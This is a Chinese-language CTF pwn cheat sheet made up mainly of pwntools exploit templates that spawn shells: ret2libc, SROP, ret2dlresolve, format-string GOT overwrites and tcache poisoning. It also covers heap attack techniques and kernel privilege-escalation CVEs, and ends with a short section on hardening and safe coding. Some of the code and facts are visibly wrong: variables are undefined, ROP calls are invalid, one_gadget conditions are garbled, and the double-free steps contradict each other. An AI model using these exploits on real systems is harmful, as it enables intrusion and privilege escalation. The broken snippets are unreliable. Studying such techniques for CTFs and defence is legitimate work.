# Pwn 攻防深度手册

## 1. checksec 应对策略表

### 1.1 安全机制速查

```bash
$ checksec --file=./binary
Arch:     amd64-64-little     # 架构
RELRO:    Full RELRO            # GOT 只读
Stack:    Canary found          # 栈保护
NX:       NX enabled            # 栈不可执行
PIE:      PIE enabled           # 地址随机化
```

### 1.2 安全机制组合 → 利用策略对照表

| Checksec 状态 | 可利用方式 | 说明 |
|--------------|----------|------|
| **NX disabled + No PIE + No Canary** | ret2shellcode / 经典栈溢出 | 最简单，栈上执行 shellcode |
| **NX enabled + No PIE + No Canary** | ret2text / ret2libc | 栈不可执行，跳转到已有函数或 libc |
| **NX + No Canary + PIE** | ret2libc (需泄漏基址) | 需要信息泄漏绕过 PIE |
| **NX + Canary + No PIE** | 格式化字符串泄漏 Canary → 栈溢出 | 先泄漏 Canary 再溢出 |
| **NX + Canary + PIE + Full RELRO** | 格式化字符串泄漏 → ret2libc | 最高安全级别，需泄漏+覆盖 |
| **NX + Canary + PIE + Partial RELRO** | GOT 表覆盖（仅 Partial RELRO） | 覆盖 GOT entry |
| **无 NX + 有 Canary** | shellcode + 格式化字符串泄漏 Canary | 复杂组合 |

### 1.3 按架构分类

| 架构 | 寄存器 | shellcode 系统调用号 |
|------|--------|---------------------|
| x86 (32-bit) | eax=syscall, ebx=arg1, ecx=arg2, edx=arg3 | execve=0x0b |
| x64 (64-bit) | rax=syscall, rdi=arg1, rsi=arg2, rdx=arg3, r10=arg4, r8=arg5, r9=arg6 | execve=0x3b |
| ARM | r7=syscall, r0=arg1, r1=arg2, r2=arg3 | execve=11 |
| ARM64 | x8=syscall, x0=arg1, x1=arg2, x2=arg3 | execve=221 |

---

## 2. pwntools 完整利用模板

### 2.1 ret2text 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

binary = ELF('./challenge')
# libc = ELF('./libc.so.6')  # 如有 libc

p = process('./challenge')
# p = remote('target.com', 9999)

# 1. 找溢出偏移
# 用 cyclic pattern 填充，计算返回地址位置
offset = 72  # 例: 64 字节 buffer + 8 字节 rbp

# 2. 构造 payload
ret_addr = binary.symbols['target_function']  # 目标函数地址
# 或: rop = ROP(binary); rop.raw(binary.symbols['target'])
#     payload = cyclic(offset) + rop.chain()

payload = cyclic(offset) + p64(ret_addr)
p.sendline(payload)
p.interactive()
```

### 2.2 ret2libc 模板（x64）

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

binary = ELF('./challenge')
libc = ELF('./libc.so.6')  # 如无则通过泄漏获取

p = process('./challenge')

# Step 1: 构造 ROP 链泄漏 libc 基址
rop = ROP(binary)
rop.puts(binary.got['puts'])  # 调用 puts 打印 GOT 中 puts 地址
rop.raw(binary.symbols['main'])  # 返回 main 再次执行

offset = 72
payload = cyclic(offset) + rop.chain()
p.sendline(payload)

# Step 2: 解析泄漏的 libc 地址
p.recvuntil(b'Input:')
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Step 3: 构造 ret2system
rop2 = ROP(binary)
rop2.raw(rop2.find_gadget(['pop rdi', 'ret'])[0])
rop2.raw(binsh_addr)  # rdi = '/bin/sh'
rop2.raw(ret_addr_gadget)  # 对齐栈（如需要）
rop2.raw(system_addr)  # system('/bin/sh')

payload2 = cyclic(offset) + rop2.chain()
p.sendline(payload2)
p.interactive()
```

### 2.3 ret2libc 模板（x86）

```python
#!/usr/bin/env python3
from pwn import *

context(arch='i386', os='linux', log_level='info')

binary = ELF('./challenge')
libc = ELF('./libc.so.6')

p = process('./challenge')

# Step 1: 泄漏 libc
offset = 44  # 32位: 40 buffer + 4 rbp
payload = cyclic(offset) + p32(binary.plt['puts']) + p32(binary.symbols['main']) + p32(binary.got['puts'])
p.sendline(payload)

leaked_puts = u32(p.recvline().strip()[:4])
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Step 2: ret2system
payload2 = cyclic(offset) + p32(system_addr) + b'AAAA' + p32(binsh_addr)
p.sendline(payload2)
p.interactive()
```

### 2.4 ret2csu 模板（x64，多参数）

```python
from pwn import *

# 利用 __libc_csu_init 的 gadget 链
# 适合需要设置多个参数的场景

# 找 csu gadget
# $ ROPgadget --binary binary | grep "pop rbx"
# 通常在 __libc_csu_init 内

csu_gadget1 = 0x40069a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_gadget2 = 0x400680  # mov rdx,r15; mov rsi,r14; mov edi,r13; call [r12+rbx*8]

# 构造
payload = cyclic(offset)
payload += p64(csu_gadget1)
payload += p64(0)          # rbx = 0
payload += p64(1)          # rbp = 1
payload += p64(binary.got['func'])  # r12 = 目标函数 GOT
payload += p64(arg1)       # r13 = edi (arg1)
payload += p64(arg2)       # r14 = rsi (arg2)
payload += p64(arg3)       # r15 = rdx (arg3)
payload += p64(csu_gadget2)
# ... call 后恢复栈
```

### 2.5 SROP (Sigreturn Oriented Programming)

```python
from pwn import *

# 构造 sigreturn 系统调用 → 伪造栈帧 → execve('/bin/sh', 0, 0)
# 需要: sigreturn gadget + 可控栈 + 有 syscall gadget

# 1. 找 sigreturn gadget
#    ROPgadget --binary libc | grep "sigreturn"
sigreturn = libc_base + 0x45134  # sigreturn gadget

# 2. 伪造 sigcontext 结构
# 在栈上构造 64 字节 sigcontext，然后 sigreturn 恢复
frame = SigreturnFrame()
frame.rax = 0x3b        # execve syscall
frame.rdi = binsh_addr   # arg1: '/bin/sh'
frame.rsi = 0            # arg2: NULL
frame.rdx = 0            # arg3: NULL
frame.rsp = new_stack_top  # 新栈顶
frame.rip = syscall_addr  # syscall gadget

# 3. 触发 sigreturn
payload = cyclic(offset) + p64(sigreturn) + bytes(frame)
```

### 2.6 ret2dlresolve

```python
from pwn import *

# 利用动态链接器解析任意符号
# 适合无 libc 版本信息时

# 1. 构造 JMPRELENT 和 STRTAB
# 2. 伪造 JMPREL 结构指向可控内存
# 3. 伪造符号名 → 动态解析 system

# pwntools 封装
try:
    dlresolve = Ret2dlresolvePayload(
        binary, symbol="system", args=["/bin/sh"]
    )
    rop.gets(dlresolve.data_addr)  # 读入 payload
    rop.ret2dlresolve(dlresolve)
except:
    pass
```

### 2.7 Stack Pivot

```python
from pwn import *

# 溢出控制栈指针，迁移到可控区域
# 常见可控区域: BSS, heap, mmap

# 1. 找 pivot gadget
#    ROPgadget --binary binary | grep "leave; ret"
leave_ret = 0x400683

# 2. 构造栈布局
# 目标: rbp = 可控地址 - 8, 然后 leave 会 mov rsp, rbp; pop rbp
target_bss = 0x601000  # BSS 起始地址

# 栈布局 (从当前 rsp 开始):
# [rbp-8]       = target_bss - 8  (新栈基)
# [rbp]         = 任意
# [rbp+8]       = rop 链开始 (leave 后 rsp 指向这里)

payload = cyclic(buffer_size)
payload += p64(target_bss - 8)  # 新 rbp
payload += p64(leave_ret)       # 执行 leave
# BSS 上预写 rop 链
# p64(pop_rdi) + p64(binsh) + p64(system)
```

### 2.8 one_gadget 利用

```bash
# 查找 one_gadget
$ one_gadget libc.so.6
# 输出: 0x45134: execve("/bin/sh", rsi, rdx) → 条件: rsi==NULL || rsi==0
#       0xef977: execve("/bin/sh", rsi, rdx) → 条件: rdi==NULL || rdi==NULL
```

```python
from pwn import *

# one_gadget 需要满足特定寄存器条件
# 先通过 ROP 满足条件，再跳 one_gadget

# 例: 需要 rdi==NULL, rsi==NULL
rop = ROP(binary)
rop.raw(pop_rdi) + p64(0)  # rdi = 0
rop.raw(pop_rsi) + p64(0)  # rsi = 0 (可能需要额外 gadget)
rop.raw(one_gadget_addr)
payload = cyclic(offset) + rop.chain()
```

### 2.9 格式化字符串利用

```python
from pwn import *

# 格式化字符串漏洞: printf(user_input) 或 printf(buf)
# %n 可写任意地址（但需绕过 Full RELRO）

# 1. 泄漏栈数据
# %7$x → 第7个参数 (64位)
# %p  → 栈上任意位置
# %s  → 任意地址读取

# 2. 计算偏移
# 先发送 %p%p%p%p%p%p%p%p%p%p 观察输出
# 确定用户输入在第几个参数位置（通常 %6$ 或 %7$）

# 3. 任意写
# 目标: 覆盖 GOT entry (仅 Partial RELRO) 或返回地址
# %[offset]$n 写 4 字节
# %[offset]$hn 写 2 字节
# %[offset]$hhn 写 1 字节

# 例: 覆盖 exit@GOT 为 main 地址
# 需要写的值 = main_addr 的低 2 字节

target = binary.got['exit']
value = binary.symbols['main'] & 0xffff
offset = 6  # 用户输入在参数 6

payload = f'%{value}c%{offset}$hn'.encode().ljust(8) + p64(target)
# 发送到格式化字符串漏洞
```

### 2.10 UAF 利用

```python
from pwn import *

# 典型 CTF UAF 模式
# 1. malloc 分配对象 A
# 2. free(A)
# 3. malloc 分配对象 B (复用 A 的内存)
# 4. 通过 B 写入虚拟表指针 → 劫持控制流

# 堆利用模板
def uaf_exploit():
    p.sendline(b'1')     # 分配 A
    p.sendline(b'3')     # 释放 A
    p.sendline(b'2')     # 分配 B (复用)
    p.sendline(p64(target_vtable))  # 写 vtable → 跳转函数
    # 调用触发虚函数
    p.sendline(b'4')     # 触发

# tcache poisoning
def tcache_poison():
    # glibc 2.27+ tcache 攻击
    malloc(2)   # chunk A
    free(A)     # 进入 tcache
    free(B)     # tcache dup (需 double free)
    # tcache 中: B → A
    # 构造 payload 让 tcache 指向 target
    malloc(target)
    # 下一次 malloc 返回 target
```

---

## 3. 常用 Gadget 速查

### 3.1 x64 常用 Gadget

```bash
# 查找命令
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi"

# 常用 gadget 列表
pop rdi; ret                        # 设置第一个参数
pop rsi; pop r15; ret               # 设置第二个参数
pop rdx; ret                        # 设置第三个参数
pop rax; ret                        # 设置系统调用号
pop r12; pop r13; pop r14; pop r15; ret  # 多寄存器
syscall                             # 触发系统调用
leave; ret                          # 栈迁移
ret                                 # 栈对齐（16字节对齐需要）
xor eax, eax; ret                   # 清零返回值
```

### 3.2 x86 常用 Gadget

```bash
pop ebx; pop ecx; pop edx; ret      # 32位 pop
push eax; ret                       # push
call eax                            # call eax 中的地址
leave; ret                          # 栈迁移
```

### 3.3 libc 常用地址（相对偏移，不同版本不同）

```bash
# 查找 libc 版本
$ ldd --version ./binary
# 或
$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

# 常用符号
libc.symbols['puts']
libc.symbols['printf']
libc.symbols['system']
libc.symbols['execve']
libc.symbols['str_bin_sh']  # '/bin/sh' 字符串
libc.symbols['__environ']   # 环境变量指针
libc.symbols['__libc_start_main']
libc.symbols['__malloc_hook']   # 旧版 glibc 钩子
libc.symbols['__free_hook']     # 旧版 glibc 钩子
libc.symbols['__free_hook']     # glibc 2.34+ 已移除
libc.symbols['__libc_realloc']
libc.symbols['__libc_malloc']
libc.symbols['__libc_free']
```

### 3.4 搜索工具

```bash
# ROPgadget
ROPgadget --binary binary > gadgets.txt
ROPgadget --binary libc.so.6 | grep -E "pop rdi|pop rsi|pop rdx|syscall|leave; ret"

# ropper
ropper -f binary --search "pop rdi"
ropper -f binary --search "syscall"
ropper -f binary --search "leave"

# one_gadget
one_gadget libc.so.6

# pwntools
ELF('libc.so.6').search(b'/bin/sh')
ELF('libc.so.6').symbols['system']
ROP(libc).find_gadget(['pop rdi', 'ret'])
```

---

## 4. 堆利用手法完整列表

### 4.1 按 glibc 版本分类

| glibc 版本 | 可用手法 |
|-----------|---------|
| < 2.27 | Fastbin Dup, Unsorted Bin Attack, House of Force, House of Spirit |
| 2.27-2.29 | Tcache Attack (无 key), Tcache Poisoning |
| 2.29-2.31 | Tcache Attack (有 key, 需泄漏 key), Unsorted Bin Attack |
| >= 2.32 | Safe-linking (tcache fd 加密), 需泄漏加密 key |
| >= 2.34 | `__malloc_hook` / `__free_hook` 已完全移除 |

### 4.2 手法详解

**Unsorted Bin Attack (glibc < 2.29)**
```python
# 利用 unsorted bin 链表中残留的 libc 指针
# 泄漏: 从 unsorted bin 取出的 chunk 的 fd/bk 指向 libc 地址
# 利用: 让目标地址写入 chunk 的 fd/bk → 实现任意写

# 步骤:
# 1. 分配 chunk A (large enough → 进入 unsorted bin)
# 2. 分配 chunk B (防止与 top chunk 合并)
# 3. free(A) → A 进入 unsorted bin
# 4. free(B) → B 进入 unsorted bin
# 5. 分配一个大的 chunk → 从 unsorted bin 中取出 B
# 6. 修改 B 的 fd/bk → 构造 unsorted bin 写入
```

**Tcache Poisoning (glibc 2.27+)**
```python
# 污染 tcache 链表 → 下一次 malloc 返回任意地址
# 步骤:
# 1. malloc → 得到 chunk A
# 2. free(A) → A 进入 tcache
# 3. malloc → 得到 chunk B (同大小, 会复用 A)
# 4. 通过 B 修改 A 的 next 指针 → 指向目标地址
# 5. free(B) → tcache: B → A → target
# 6. 再次 malloc → 返回 target 地址
# 7. 写入 shellcode / 覆盖 __free_hook
```

**Double Free**
```python
# 释放同一块内存两次 → 进入 tcache 两次
# 步骤:
# 1. malloc → A
# 2. free(A) → tcache: A
# 3. free(B) → tcache: B → A  (B == A → 双重释放!)
# 4. malloc → 得到 A
# 5. malloc → 得到 A 再次 (double free 生效)
# 6. 修改 A 内容 → 构造任意地址
```

**Off-by-one**
```python
# 溢出写入相邻 chunk 的元数据
# 常见: 堆缓冲区末字节溢出 → 覆盖相邻 chunk 的 prev_size
# 利用: chunk 合并时伪造 prev_size → 实现 chunk overlap
```

**House of Force**
```python
# 利用 top chunk 的 size 溢出
# 步骤:
# 1. malloc → chunk A (紧邻 top chunk)
# 2. 溢出修改 top chunk 的 size (设为 -1 或巨大值)
# 3. 下次 malloc 返回任意地址 (因为 top chunk 看起来巨大)
```

**House of Spirit**
```python
# 伪造 fake chunk → 堆风水
# 步骤:
# 1. 在可控内存（BSS/堆）构造 fake chunk
# 2. fake chunk 的 fd/bk 指向满足检查的地址
# 3. 触发 unsorted bin 操作 → 写入任意地址
```

### 4.3 堆防护机制

```bash
# glibc 2.29+ Tcache Key
# 每次从 tcache 取 chunk 时 XOR key
# 需要泄漏 key 或绕过

# glibc 2.32+ Safe-linking
# tcache->next = PTR ^ key
# 利用时需要知道 key 的值

# glibc 2.34+ 移除 __malloc_hook/__free_hook
# 改用 tcache poisoning 直接攻击函数指针

# checksec 中的堆防护
# $ checksec --file=binary
# 查看是否有 GLIBC_2.29/2.32 版本标记
```

---

## 5. 整数溢出

```python
# 有符号溢出
MAX_INT = 2**31 - 1
value = MAX_INT + 1  # → -2147483648 (溢出为负数)

# 无符号溢出
MAX_UINT = 2**32
value = MAX_UINT + 1  # → 1 (溢出)

# malloc(-1) → 巨大分配
# read(0, buf, 2**32 + 1) → 绕过长度检查

# pwntools 构造
p.sendline(str(-1 & 0xffffffff))  # 转为无符号大数
```

---

## 6. 内核 Pwn 常用提权漏洞

| CVE | 漏洞 | 说明 |
|-----|------|------|
| CVE-2016-5195 | Dirty COW | 本地提权，15行 PoC |
| CVE-2022-0847 | Dirty Pipe | 本地提权 |
| CVE-2021-34866 | eBPF 提权 | 本地提权 |
| CVE-2022-2585 | posix_timers | 提权 |
| CVE-2021-22555 | netfilter UAF | 提权 |
| CVE-2019-18634 | sudo 任意命令执行 | sudo 漏洞 |

```bash
# Dirty COW PoC
# 编译: gcc dirtycow.c -o dirtycow -pthread
# 运行: ./dirtycow
# 效果: 覆盖 /etc/passwd，添加 root 用户

# Dirty Pipe PoC
# 利用 pipe 缓冲区写入只读文件
# 可提权 / 读取敏感文件
```

---

## 7. GDB + pwndbg 常用命令

```gdb
# 基础
checksec            # 安全检查
cyclic 100          # 生成 pattern
cyclic -l <addr>    # 计算 pattern 偏移
pattern_offset rax  # 计算寄存器偏移

# 断点
b *0x401234         # 地址断点
b main              # 函数断点
watch *(int*)0x601000  # 内存断点

# 运行
r                   # 运行
n                   # 单步执行 (step over)
s                   # 单步进入 (step into)
ni                  # 单条指令 step over
si                  # 单条指令 step into
c                   # 继续运行
finish              # 执行到函数返回

# 查看
info registers      # 所有寄存器
x/30gx $rsp         # 栈查看 (30条, 8字节十六进制)
x/10i $rip          # 反汇编 10 条
disassemble         # 反汇编当前函数
hexdump binary      # 查看二进制

# pwndbg 扩展
ctx                 # 查看寄存器+栈+反汇编
rop                 # ROP gadget 搜索
heap                # 堆布局查看
canary              # Canary 检查
```

---

## 8. Pwn 防御措施

### 8.1 编译时防护

```bash
# 基础防护
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE -pie -z noexecstack -z relro,-z,now -o binary source.c

# 参数说明:
# -fstack-protector-strong: 栈保护（Canary）
# -D_FORTIFY_SOURCE=2: 强化安全检查
# -fPIE -pie: 位置无关可执行
# -z noexecstack: 栈不可执行
# -z relro,-z,now: 全部 RELRO
```

### 8.2 运行时防护

```bash
# ASLR 检查
cat /proc/sys/kernel/randomize_va_space
# 2 = 全随机化（推荐）

# NX (内核支持)
# 默认启用: /proc/cpuinfo 中的 NX 标志

# SELinux / AppArmor
# 限制进程权限

# seccomp
# 过滤系统调用
```

### 8.3 源码审计

```c
// 危险函数清单
scanf        → 用 fgets/snprintf
strcpy       → 用 strncpy/memcpy (检查长度)
strcat       → 用 strncat
sprintf      → 用 snprintf
gets         → 用 fgets (绝不能用 gets!)
system/popen → 用 execve (不通过 shell)
malloc/free  → 检查所有路径

// 安全编程检查项
// 1. 所有输入检查长度
// 2. 数组索引检查边界
// 3. 指针释放后置 NULL
// 4. 格式化字符串检查（printf(buf) → printf("%s", buf)）
// 5. 整数溢出检查
// 6. 并发操作加锁
```
